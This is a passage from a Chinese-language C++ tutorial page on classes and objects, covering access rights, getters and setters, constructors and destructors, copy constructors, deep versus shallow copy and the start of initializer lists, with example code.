&#x2F;&#x2F;私有权限类外访问不到</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="struct和class区别"><a href="#struct和class区别" class="headerlink" title="struct和class区别"></a>struct和class区别</h3><p>在C++中 struct和class唯一的<strong>区别</strong>就在于 <strong>默认的访问权限不同</strong></p><p>区别：</p><ul><li>struct 默认权限为公共</li><li>class 默认权限为私有</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class C1</span><br><span class="line">&#123;</span><br><span class="line">int  m_A; &#x2F;&#x2F;默认是私有权限</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct C2</span><br><span class="line">&#123;</span><br><span class="line">int m_A;  &#x2F;&#x2F;默认是公共权限</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">C1 c1;</span><br><span class="line">c1.m_A &#x3D; 10; &#x2F;&#x2F;错误，访问权限是私有</span><br><span class="line"></span><br><span class="line">C2 c2;</span><br><span class="line">c2.m_A &#x3D; 10; &#x2F;&#x2F;正确，访问权限是公共</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="成员属性设置为私有"><a href="#成员属性设置为私有" class="headerlink" title="成员属性设置为私有"></a>成员属性设置为私有</h3><p><strong>优点1：</strong>将所有成员属性设置为私有，可以自己控制读写权限</p><p><strong>优点2：</strong>对于写权限，我们可以检测数据的有效性</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">class Person &#123;</span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;姓名设置可读可写</span><br><span class="line">void setName(string name) &#123;</span><br><span class="line">m_Name &#x3D; name;</span><br><span class="line">&#125;</span><br><span class="line">string getName()</span><br><span class="line">&#123;</span><br><span class="line">return m_Name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;获取年龄 </span><br><span class="line">int getAge() &#123;</span><br><span class="line">return m_Age;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;设置年龄</span><br><span class="line">void setAge(int age) &#123;</span><br><span class="line">if (age &lt; 0 || age &gt; 150) &#123;</span><br><span class="line">cout &lt;&lt; &quot;你个老妖精!&quot; &lt;&lt; endl;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">m_Age &#x3D; age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;情人设置为只写</span><br><span class="line">void setLover(string lover) &#123;</span><br><span class="line">m_Lover &#x3D; lover;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">string m_Name; &#x2F;&#x2F;可读可写  姓名</span><br><span class="line"></span><br><span class="line">int m_Age; &#x2F;&#x2F;只读  年龄</span><br><span class="line"></span><br><span class="line">string m_Lover; &#x2F;&#x2F;只写  情人</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">Person p;</span><br><span class="line">&#x2F;&#x2F;姓名设置</span><br><span class="line">p.setName(&quot;张三&quot;);</span><br><span class="line">cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; p.getName() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;年龄设置</span><br><span class="line">p.setAge(50);</span><br><span class="line">cout &lt;&lt; &quot;年龄： &quot; &lt;&lt; p.getAge() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;情人设置</span><br><span class="line">p.setLover(&quot;苍井&quot;);</span><br><span class="line">&#x2F;&#x2F;cout &lt;&lt; &quot;情人： &quot; &lt;&lt; p.m_Lover &lt;&lt; endl;  &#x2F;&#x2F;只写属性，不可以读取</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对象的初始化和清理"><a href="#对象的初始化和清理" class="headerlink" title="对象的初始化和清理"></a>对象的初始化和清理</h2><ul><li>生活中我们买的电子产品都基本会有出厂设置，在某一天我们不用时候也会删除一些自己信息数据保证安全</li><li>C++中的面向对象来源于生活，每个对象也都会有初始设置以及 对象销毁前的清理数据的设置。</li></ul><h3 id="构造函数和析构函数"><a href="#构造函数和析构函数" class="headerlink" title="构造函数和析构函数"></a>构造函数和析构函数</h3><p>对象的<strong>初始化和清理</strong>也是两个非常重要的安全问题</p><p> 一个对象或者变量没有初始状态，对其使用后果是未知</p><p> 同样的使用完一个对象或变量，没有及时清理，也会造成一定的安全问题</p><p>c++利用了<strong>构造函数</strong>和<strong>析构函数</strong>解决上述问题，这两个函数将会被编译器自动调用，完成对象初始化和清理工作。</p><p>对象的初始化和清理工作是编译器强制要我们做的事情，因此如果<strong>我们不提供构造和析构，编译器会提供</strong></p><p><strong>编译器提供的构造函数和析构函数是空实现。</strong></p><ul><li>构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用，无须手动调用。</li><li>析构函数：主要作用在于对象<strong>销毁前</strong>系统自动调用，执行一些清理工作。</li></ul><p><strong>构造函数语法：</strong><code>类名()&#123;&#125;</code></p><ol><li>构造函数，没有返回值也不写void</li><li>函数名称与类名相同</li><li>构造函数可以有参数，因此可以发生重载</li><li>程序在调用对象时候会自动调用构造，无须手动调用,而且只会调用一次</li></ol><p><strong>析构函数语法：</strong> <code>~类名()&#123;&#125;</code></p><ol><li>析构函数，没有返回值也不写void</li><li>函数名称与类名相同,在名称前加上符号 ~</li><li>析构函数不可以有参数，因此不可以发生重载</li><li>程序在对象销毁前会自动调用析构，无须手动调用,而且只会调用一次</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">&#x2F;&#x2F;构造函数</span><br><span class="line">Person()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Person的构造函数调用&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;析构函数</span><br><span class="line">~Person()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Person的析构函数调用&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">Person p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数的分类及调用"><a href="#构造函数的分类及调用" class="headerlink" title="构造函数的分类及调用"></a>构造函数的分类及调用</h3><p>两种分类方式：</p><p> 按参数分为： 有参构造和无参构造</p><p> 按类型分为： 普通构造和拷贝构造</p><p>三种调用方式：</p><p> 括号法</p><p> 显示法</p><p> 隐式转换法</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;1、构造函数分类</span><br><span class="line">&#x2F;&#x2F; 按照参数分类分为 有参和无参构造   无参又称为默认构造函数</span><br><span class="line">&#x2F;&#x2F; 按照类型分类分为 普通构造和拷贝构造</span><br><span class="line"></span><br><span class="line">class Person &#123;</span><br><span class="line">public:</span><br><span class="line">&#x2F;&#x2F;无参（默认）构造函数</span><br><span class="line">Person() &#123;</span><br><span class="line">cout &lt;&lt; &quot;无参构造函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;有参构造函数</span><br><span class="line">Person(int a) &#123;</span><br><span class="line">age &#x3D; a;</span><br><span class="line">cout &lt;&lt; &quot;有参构造函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;拷贝构造函数</span><br><span class="line">Person(const Person&amp; p) &#123;</span><br><span class="line">age &#x3D; p.age;</span><br><span class="line">cout &lt;&lt; &quot;拷贝构造函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;析构函数</span><br><span class="line">~Person() &#123;</span><br><span class="line">cout &lt;&lt; &quot;析构函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line">int age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2、构造函数的调用</span><br><span class="line">&#x2F;&#x2F;调用无参构造函数</span><br><span class="line">void test01() &#123;</span><br><span class="line">Person p; &#x2F;&#x2F;调用无参构造函数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;调用有参的构造函数</span><br><span class="line">void test02() &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2.1  括号法，常用</span><br><span class="line">Person p1(10);</span><br><span class="line">&#x2F;&#x2F;注意1：调用无参构造函数不能加括号，如果加了编译器认为这是一个函数声明</span><br><span class="line">&#x2F;&#x2F;Person p2();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2.2 显式法</span><br><span class="line">Person p2 &#x3D; Person(10); </span><br><span class="line">Person p3 &#x3D; Person(p2);</span><br><span class="line">&#x2F;&#x2F;Person(10)单独写就是匿名对象  当前行结束之后，马上析构</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2.3 隐式转换法</span><br><span class="line">Person p4 &#x3D; 10; &#x2F;&#x2F; Person p4 &#x3D; Person(10); </span><br><span class="line">Person p5 &#x3D; p4; &#x2F;&#x2F; Person p5 &#x3D; Person(p4); </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;注意2：不能利用 拷贝构造函数 初始化匿名对象 编译器认为是对象声明</span><br><span class="line">&#x2F;&#x2F;Person p5(p4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line">&#x2F;&#x2F;test02();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="拷贝构造函数调用时机"><a href="#拷贝构造函数调用时机" class="headerlink" title="拷贝构造函数调用时机"></a>拷贝构造函数调用时机</h3><p>C++中拷贝构造函数调用时机通常有三种情况</p><ul><li>使用一个已经创建完毕的对象来初始化一个新对象</li><li>值传递的方式给函数参数传值</li><li>以值方式返回局部对象</li></ul><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">class Person &#123;</span><br><span class="line">public:</span><br><span class="line">Person() &#123;</span><br><span class="line">cout &lt;&lt; &quot;无参构造函数!&quot; &lt;&lt; endl;</span><br><span class="line">mAge &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line">Person(int age) &#123;</span><br><span class="line">cout &lt;&lt; &quot;有参构造函数!&quot; &lt;&lt; endl;</span><br><span class="line">mAge &#x3D; age;</span><br><span class="line">&#125;</span><br><span class="line">Person(const Person&amp; p) &#123;</span><br><span class="line">cout &lt;&lt; &quot;拷贝构造函数!&quot; &lt;&lt; endl;</span><br><span class="line">mAge &#x3D; p.mAge;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;析构函数在释放内存之前调用</span><br><span class="line">~Person() &#123;</span><br><span class="line">cout &lt;&lt; &quot;析构函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line">int mAge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1. 使用一个已经创建完毕的对象来初始化一个新对象</span><br><span class="line">void test01() &#123;</span><br><span class="line"></span><br><span class="line">Person man(100); &#x2F;&#x2F;p对象已经创建完毕</span><br><span class="line">Person newman(man); &#x2F;&#x2F;调用拷贝构造函数</span><br><span class="line">Person newman2 &#x3D; man; &#x2F;&#x2F;拷贝构造</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Person newman3;</span><br><span class="line">&#x2F;&#x2F;newman3 &#x3D; man; &#x2F;&#x2F;不是调用拷贝构造函数，赋值操作</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2. 值传递的方式给函数参数传值</span><br><span class="line">&#x2F;&#x2F;相当于Person p1 &#x3D; p;</span><br><span class="line">void doWork(Person p1) &#123;&#125;</span><br><span class="line">void test02() &#123;</span><br><span class="line">Person p; &#x2F;&#x2F;无参构造函数</span><br><span class="line">doWork(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;3. 以值方式返回局部对象</span><br><span class="line">Person doWork2()</span><br><span class="line">&#123;</span><br><span class="line">Person p1;</span><br><span class="line">cout &lt;&lt; (int *)&amp;p1 &lt;&lt; endl;</span><br><span class="line">return p1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void test03()</span><br><span class="line">&#123;</span><br><span class="line">Person p &#x3D; doWork2();</span><br><span class="line">cout &lt;&lt; (int *)&amp;p &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;test01();</span><br><span class="line">&#x2F;&#x2F;test02();</span><br><span class="line">test03();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数调用规则"><a href="#构造函数调用规则" class="headerlink" title="构造函数调用规则"></a>构造函数调用规则</h3><p>默认情况下，c++编译器至少给一个类添加3个函数</p><p>1．默认构造函数(无参，函数体为空)</p><p>2．默认析构函数(无参，函数体为空)</p><p>3．默认拷贝构造函数，对属性进行值拷贝</p><p>构造函数调用规则如下：</p><ul><li>如果用户定义有参构造函数，c++不在提供默认无参构造，但是会提供默认拷贝构造</li><li>如果用户定义拷贝构造函数，c++不会再提供其他构造函数</li></ul><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">class Person &#123;</span><br><span class="line">public:</span><br><span class="line">&#x2F;&#x2F;无参（默认）构造函数</span><br><span class="line">Person() &#123;</span><br><span class="line">cout &lt;&lt; &quot;无参构造函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;有参构造函数</span><br><span class="line">Person(int a) &#123;</span><br><span class="line">age &#x3D; a;</span><br><span class="line">cout &lt;&lt; &quot;有参构造函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;拷贝构造函数</span><br><span class="line">Person(const Person&amp; p) &#123;</span><br><span class="line">age &#x3D; p.age;</span><br><span class="line">cout &lt;&lt; &quot;拷贝构造函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;析构函数</span><br><span class="line">~Person() &#123;</span><br><span class="line">cout &lt;&lt; &quot;析构函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line">int age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">Person p1(18);</span><br><span class="line">&#x2F;&#x2F;如果不写拷贝构造，编译器会自动添加拷贝构造，并且做浅拷贝操作</span><br><span class="line">Person p2(p1);</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;p2的年龄为： &quot; &lt;&lt; p2.age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void test02()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;如果用户提供有参构造，编译器不会提供默认构造，会提供拷贝构造</span><br><span class="line">Person p1; &#x2F;&#x2F;此时如果用户自己没有提供默认构造，会出错</span><br><span class="line">Person p2(10); &#x2F;&#x2F;用户提供的有参</span><br><span class="line">Person p3(p2); &#x2F;&#x2F;此时如果用户没有提供拷贝构造，编译器会提供</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;如果用户提供拷贝构造，编译器不会提供其他构造函数</span><br><span class="line">Person p4; &#x2F;&#x2F;此时如果用户自己没有提供默认构造，会出错</span><br><span class="line">Person p5(10); &#x2F;&#x2F;此时如果用户自己没有提供有参，会出错</span><br><span class="line">Person p6(p5); &#x2F;&#x2F;用户自己提供拷贝构造</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="深拷贝与浅拷贝"><a href="#深拷贝与浅拷贝" class="headerlink" title="深拷贝与浅拷贝"></a>深拷贝与浅拷贝</h3><p>深浅拷贝是面试经典问题，也是常见的一个坑</p><p>浅拷贝：简单的赋值拷贝操作</p><p>深拷贝：在堆区重新申请空间，进行拷贝操作</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">class Person &#123;</span><br><span class="line">public:</span><br><span class="line">&#x2F;&#x2F;无参（默认）构造函数</span><br><span class="line">Person() &#123;</span><br><span class="line">cout &lt;&lt; &quot;无参构造函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;有参构造函数</span><br><span class="line">Person(int age ,int height) &#123;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;有参构造函数!&quot; &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">m_age &#x3D; age;</span><br><span class="line">m_height &#x3D; new int(height);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;拷贝构造函数  </span><br><span class="line">Person(const Person&amp; p) &#123;</span><br><span class="line">cout &lt;&lt; &quot;拷贝构造函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#x2F;&#x2F;如果不利用深拷贝在堆区创建新内存，会导致浅拷贝带来的重复释放堆区问题</span><br><span class="line">m_age &#x3D; p.m_age;</span><br><span class="line">m_height &#x3D; new int(*p.m_height);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;析构函数</span><br><span class="line">~Person() &#123;</span><br><span class="line">cout &lt;&lt; &quot;析构函数!&quot; &lt;&lt; endl;</span><br><span class="line">if (m_height !&#x3D; NULL)</span><br><span class="line">&#123;</span><br><span class="line">delete m_height;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line">int m_age;</span><br><span class="line">int* m_height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">Person p1(18, 180);</span><br><span class="line"></span><br><span class="line">Person p2(p1);</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;p1的年龄： &quot; &lt;&lt; p1.m_age &lt;&lt; &quot; 身高： &quot; &lt;&lt; *p1.m_height &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;p2的年龄： &quot; &lt;&lt; p2.m_age &lt;&lt; &quot; 身高： &quot; &lt;&lt; *p2.m_height &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结：如果属性有在堆区开辟的，一定要自己提供拷贝构造函数，防止浅拷贝带来的问题</p></blockquote><h3 id="初始化列表"><a href="#初始化列表" class="headerlink" title="初始化列表"></a>初始化列表</h3><p><strong>作用：</strong></p><p>C++提供了初始化列表语法，用来初始化属性</p><p><strong>语法：</strong><code>构造函数()：属性1(值1),属性2（值2）... &#123;&#125;</code></p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">class Person &#123;</span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;传统方式初始化</span><br><span class="line">&#x2F;&#x2F;Person(int a, int b, int c) &#123;</span><br><span class="line">&#x2F;&#x2F;m_A &#x3D; a;</span><br><span class="line">&#x2F;&#x2F;m_B &#x3D; b;</span><br><span class="line">&#x2F;&#x2F;m_C &#x3D; c;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;初始化列表方式初始化</span><br><span class="line">Person(int a, int b, int c) :m_A(a), m_B(b), m_C(c) 